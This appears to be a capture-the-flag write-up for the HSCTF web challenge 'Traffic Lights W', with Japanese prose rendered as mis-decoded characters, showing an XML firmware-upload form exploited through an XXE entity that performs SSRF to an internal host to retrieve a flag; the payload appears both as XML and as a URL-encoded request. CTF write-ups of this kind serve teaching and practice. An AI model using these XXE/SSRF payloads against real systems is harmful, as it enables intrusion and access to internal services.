# Traffic Lights W

```
web traffic lights

ð¦Can you figure out what's going on with this shady company?
https://traffic-light-w.web.hsctf.com/
Author: meow
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83937878-62910800-a80b-11ea-9e2d-b13eb7781b1a.png)

åé¡ã®ãã¼ã¸ã«ç§»åããã¨`Traffic Light Dashboard`ã¨ãããã¼ã¸ãæ¨ç¤ºããã¾ããã

ã°ã©ãã®ä¸ã«ãã`Current Status`ãã`# 	Active 	Docker Hostname 	Port 	Firmware`ã¨ããé ç®ãããã¾ãã

ä»`Action`ã`True`ãªã®ã¯`#1001`ã¨`#1004`ã®2ã¤ã«ãªãã¾ãã

`#1001`ã®æ¹ã®`Upload Firmware`ãéãã¦ã¿ãã¨ä»¥ä¸ã®ããã«æ¨ç¤ºããã¦`XML`ã³ã¼ããéããããã§ãã

![2](https://user-images.githubusercontent.com/47602064/83939360-472bfa00-a817-11ea-9d47-6f5d030d5e22.png)

`Example: example`ã¨ããã®ã§è¦ã¦ã¿ãã¨ä»¥ä¸ã®åå®¹ã§ããã

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
  <content>Red</content>
</root>
```

ãããè©¦ãã«æ¿å¥ãã¦ã¿ãã¨ä»¥ä¸ã®ããã«æ¨ç¤ºããã¾ããã

```
https://traffic-light-w.web.hsctf.com/firmware_upload.php?xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3Croot%3E%0D%0A++%3Ccontent%3ERed%3C%2Fcontent%3E%0D%0A%3C%2Froot%3E
```

![3](https://user-images.githubusercontent.com/47602064/83939407-b0ac0880-a817-11ea-85b9-d0dde1781846.png)

ããã§æ¿å¥ããXMLãæ©è½ãã¦ãããã¨ããããã¾ããã

<br>

ããã«ãã`XXE`ãè¡ããå¯è½æ§ãããã¾ãã

æ¬¡ã«`XXE`ã«åãè¾¼ãã§`SSRF`ãåºæ¥ãããã«ãã¾ãã

ä»åã¯2ã¤ã`Action`ã§`True`ã«ãªã£ã¦ãã¾ãã

ãªã®ã§ã©ã¡ãããä½¿ãããã§ãã

<br>

2ã¤ã¨ãè©¦ãããã`#1004`ãä¸æãå®è¡ã§ãã¾ããã

ä»¥ä¸ã®åå®¹ã`#1001`ã«éãã¾ãã

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://traffic-light-1004">]>
<root>
  <content>&xxe;</content>
</root>
```
ããã¨`XXE`ã«åãè¾¼ãã `SSRF`ã«ããä¸æãå®è¡ããã¦flagãè¡¨ç¤ºããã¾ããã

```
https://traffic-light-w.web.hsctf.com/firmware_upload.php?xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3C%21DOCTYPE+root+%5B%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2Ftraffic-light-1004%22%3E%5D%3E%0D%0A%3Croot%3E%0D%0A++%3Ccontent%3E%26xxe%3B%3C%2Fcontent%3E%0D%0A%3C%2Froot%3E
```

![4](https://user-images.githubusercontent.com/47602064/83939223-421a7b00-a816-11ea-8d99-85e0876ed8f7.png)


```txt
If you're reading this... You found out that the traffic lights are fake. Don't tell anyone. Here's a flag to make you happy: flag{shh_im_mining_bitcoin}
```

<br><br>

## FLAG: flag{shh_im_mining_bitcoin}
